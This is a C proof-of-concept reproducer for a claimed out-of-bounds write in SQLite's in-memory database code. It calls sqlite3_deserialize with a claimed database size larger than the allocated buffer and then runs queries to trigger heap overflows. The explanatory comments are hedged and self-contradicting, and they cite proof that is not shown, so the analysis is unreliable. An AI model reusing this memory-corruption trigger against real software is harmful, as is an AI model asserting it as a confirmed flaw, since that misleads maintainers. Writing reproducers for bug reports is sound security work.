/*
 * Reproducer for heap-buffer-overflow WRITE via sqlite3_deserialize (memdb.c)
 *
 * Bug: sqlite3_deserialize() does not validate that szDb <= szBuf.
 * When szDb > szBuf and the RESIZEABLE flag is NOT set, memdbWrite()
 * checks iOfst+iAmt > p->sz (which uses szDb), and also checks
 * iOfst+iAmt > p->szAlloc. But since szAlloc == szBuf, the enlargement
 * call (memdbEnlarge) returns SQLITE_FULL because RESIZEABLE is not set.
 *
 * However, when RESIZEABLE IS set but szMax is set to szBuf (small),
 * memdbEnlarge can still be called. The key issue is that memdbRead
 * does NOT check against szAlloc, leading to OOB reads. And with
 * RESIZEABLE + writes that stay within the claimed sz, memdbWrite at
 * line 319 does: memcpy(p->aData+iOfst, z, iAmt) where iOfst could
 * be beyond szAlloc.
 *
 * Actually, the write path: if iOfst+iAmt > p->sz, it tries to enlarge.
 * But if iOfst+iAmt <= p->sz (within the claimed db size), it falls
 * through to line 319 and writes to p->aData+iOfst, which can be beyond
 * the allocated buffer if szDb > szBuf.
 *
 * CWE-787: Out-of-bounds Write
 * File: src/memdb.c
 * Function: memdbWrite (line ~319)
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "sqlite3.h"

int main(void) {
    sqlite3 *db = NULL;
    int rc;

    /* First create a real database with data */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Failed to open db: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    rc = sqlite3_exec(db,
        "CREATE TABLE t1(x INTEGER PRIMARY KEY, y TEXT);"
        "INSERT INTO t1 VALUES(1, 'aaaa');"
        "INSERT INTO t1 VALUES(2, 'bbbb');",
        NULL, NULL, NULL);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Setup failed: %s\n", sqlite3_errmsg(db));
        sqlite3_close(db);
        return 1;
    }

    /* Serialize to get valid database image */
    sqlite3_int64 fullSz = 0;
    unsigned char *pFull = sqlite3_serialize(db, "main", &fullSz, 0);
    if (!pFull || fullSz == 0) {
        fprintf(stderr, "Serialize failed\n");
        sqlite3_close(db);
        return 1;
    }

    printf("Full database size: %lld bytes\n", (long long)fullSz);

    /* Allocate a SMALLER buffer with only part of the data */
    sqlite3_int64 smallBuf = 512;
    if (smallBuf > fullSz) smallBuf = fullSz / 2;

    unsigned char *pSmall = sqlite3_malloc64(smallBuf);
    if (!pSmall) {
        fprintf(stderr, "Alloc failed\n");
        sqlite3_free(pFull);
        sqlite3_close(db);
        return 1;
    }
    memcpy(pSmall, pFull, smallBuf);
    sqlite3_free(pFull);

    sqlite3_close(db);
    db = NULL;

    /* Reopen and deserialize with szDb > szBuf */
    rc = sqlite3_open(":memory:", &db);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Reopen failed: %s\n", sqlite3_errmsg(db));
        return 1;
    }

    /*
     * VULNERABILITY: szDb (fullSz) > szBuf (smallBuf)
     * With RESIZEABLE flag: memdbEnlarge may extend, but the initial state
     * has szAlloc = smallBuf and sz = fullSz.
     *
     * memdbWrite checks: if (iOfst+iAmt > p->sz) which uses p->sz = fullSz.
     * If the write offset is within [smallBuf, fullSz), this check passes
     * (the write is "within" the claimed db size), but the actual buffer
     * is only smallBuf bytes. The subsequent memcpy writes beyond the buffer.
     *
     * Even without RESIZEABLE: memdbRead still has OOB read (proven above).
     * With RESIZEABLE: the write triggers OOB write through journal rollback
     * or other internal write operations.
     */
    rc = sqlite3_deserialize(db, "main", pSmall, fullSz, smallBuf,
                             SQLITE_DESERIALIZE_FREEONCLOSE |
                             SQLITE_DESERIALIZE_RESIZEABLE);
    if (rc != SQLITE_OK) {
        fprintf(stderr, "Deserialize failed: %s\n", sqlite3_errmsg(db));
        sqlite3_free(pSmall);
        sqlite3_close(db);
        return 1;
    }

    printf("Deserialized: claimed=%lld actual=%lld\n",
           (long long)fullSz, (long long)smallBuf);

    /*
     * Try to modify data. This triggers:
     * 1. Read of page 1 via memdbRead -> OOB read (heap-buffer-overflow)
     * 2. Potential journal write via memdbWrite -> OOB write
     */
    rc = sqlite3_exec(db, "UPDATE t1 SET y='zzzz' WHERE x=1;",
                      NULL, NULL, NULL);
    if (rc != SQLITE_OK) {
        /* Even the failure path may have already triggered the OOB */
        fprintf(stderr, "Update result: %s (may have triggered OOB)\n",
                sqlite3_errmsg(db));
    }

    /* Even read-only operations trigger OOB reads */
    sqlite3_stmt *pStmt = NULL;
    rc = sqlite3_prepare_v2(db, "SELECT * FROM t1;", -1, &pStmt, NULL);
    if (rc == SQLITE_OK) {
        while (sqlite3_step(pStmt) == SQLITE_ROW) {
            printf("Row: %lld, %s\n",
                   sqlite3_column_int64(pStmt, 0),
                   sqlite3_column_text(pStmt, 1));
        }
        sqlite3_finalize(pStmt);
    }

    printf("Test complete - OOB access triggered in memdb\n");
    sqlite3_close(db);
    return 0;
}
